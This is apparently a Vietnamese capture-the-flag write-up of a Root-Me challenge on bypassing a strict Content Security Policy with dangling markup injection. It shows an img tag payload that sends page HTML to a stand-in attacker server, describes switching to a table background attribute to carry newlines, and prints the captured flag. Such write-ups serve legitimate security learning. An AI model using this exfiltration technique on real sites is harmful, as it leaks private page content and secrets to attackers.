```diff  
@@ Web -  Client Challenges @@
```

## 2. CSP Bypass -  Dangling markup 2 [50 Points]

- Cũng như challenge trên, ta có trang web như sau

  ![2](F:\VCS_practice\rootme\img\2.jpg)

  - Trang web sẽ hiện thị ra dòng chữ **Welcome** cùng với các ký tự mà ta nhập vào

    ![2-1](F:\VCS_practice\rootme\img\2-1.jpg)

  - Thử với payload ```Reflect XSS``` đơn giản ta thấy nó bị chặn bởi **Content Security Policy**

    ![2-2](F:\VCS_practice\rootme\img\2-2.jpg)

  - Kiểm tra CSP của trang ta thấy nó không cho phép thực thi script trong trang (giá trị none nghĩa là nó không fetch dữ liệu script từ bất kỳ nguồn nào hết)

    ![2-3](F:\VCS_practice\rootme\img\2-3.jpg)

  - Thử kiểm tra độ an toàn của CSP bằng trang web [CSP Evaluator](https://csp-evaluator.withgoogle.com/) ta có kết quả như sau

    ![2-4](F:\VCS_practice\rootme\img\2-4.jpg)

  - Như hình trên, ta sẽ thấy rằng tất cả các Policy đều an toàn, chỉ có dòng cuối gợi ý cho ta về DOM-Based XSS. Thử payload DOM-Based XSS ta thấy có thể khai thác được

    ![2-5](F:\VCS_practice\rootme\img\2-5.jpg)

  - Tới đây, dựa vào tiêu đề và gợi ý trên, ta có thể biết rằng đây là DOM-Based XSS dựa vào kỹ thuật *Dangling Markup* . Sau khi search google về kỹ thuật này, ta có thể thấy nó được mô tả chi tiết ở [đây](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) gồm cả khái niệm và cách khai thác.

  - Cụ thể, *Dangling markup* là khi attacker chèn 1 thẻ html vào DOM mà không đóng các attribute của thẻ đó lại, để nó 'treo lủng lẳng' như sau:

    ```html <img src='attacker-server.com/```  

    Khi trình duyệt render phản hồi, nó sẽ duyệt các ký tự tiếp theo của thẻ trên, đến khi gặp dấu single quote (```'```) tiếp theo thì dừng lại, các ký tự vừa được duyệt sẽ trở thành một phần của đường dẫn cho thuộc tính ```src```. Khi giao diện được render, request từ ```src``` được gửi tới server của attacker, họ sẽ đọc được 1 phần nội dung của trang web mà đáng ra họ không thể thấy.

  - Quay lại vấn đề cũ, để thực thi được DOM-Based XSS và gửi request ra ngoài, ta áp dụng **Dangling markup** sử dụng một thẻ html nào đó có thể gửi request tới đường dẫn chỉ định. 

    Ta thử với thẻ ```img``` và thấy rằng nó gửi một request tới webhook của mình kèm theo tham số là chuỗi html đằng sau 

    ![2-6](F:\VCS_practice\rootme\img\2-6.jpg)

  - Vào phần ***fill in this form*** và gửi link vulnerable trên đến con bot, khi nó mở đường link thì thẻ ```img``` sẽ tự động gửi request tới webhook của chúng ta, kèm theo chuỗi html đằng sau. Nhờ đó ta có thể thấy được đoạn html chứa flag mà bot thấy được.

  - Tuy nhiên, đợi 10p vẫn không thấy request tới, em đã kiểm tra lại và thấy thuộc tính ```src``` không nhận ký tự xuống dòng 

    ![2-7](F:\VCS_practice\rootme\img\2-7.jpg)

  - Em đã tìm kiếm xem còn thuộc tính nào tự động gửi request tương tự src không, thì tìm thấy được thuộc tính background trong table

    ![2-8](F:\VCS_practice\rootme\img\2-8.jpg)

  - Test thử và thấy nó nhận cả các ký tự xuống dòng làm đường dẫn

    ![2-9](F:\VCS_practice\rootme\img\2-9.jpg)

  - Cuối cùng ta gửi payload lại và nhận được flag như ta tính.

    ![2-10](F:\VCS_practice\rootme\img\2-10.jpg)



```diff
- Flag: D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE
```

